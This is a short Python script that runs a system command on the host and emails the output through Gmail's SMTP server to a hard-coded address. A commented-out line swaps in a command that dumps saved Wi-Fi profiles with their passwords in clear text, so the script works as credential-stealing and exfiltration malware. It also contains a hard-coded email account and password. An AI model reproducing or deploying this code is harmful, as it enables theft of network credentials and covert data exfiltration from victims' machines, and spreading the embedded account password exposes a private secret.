#!/usr/bin/env Python

import subprocess, smtplib

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

#command = "netsh wlan show profile key=clear"
command = "ipconfig"
result = subprocess.check_output(command, shell=True)
send_mail("datasource226@gmail.com", "MGDZS@ejtMVywFf5VDoUvjJ75M@&!t%bn", result)
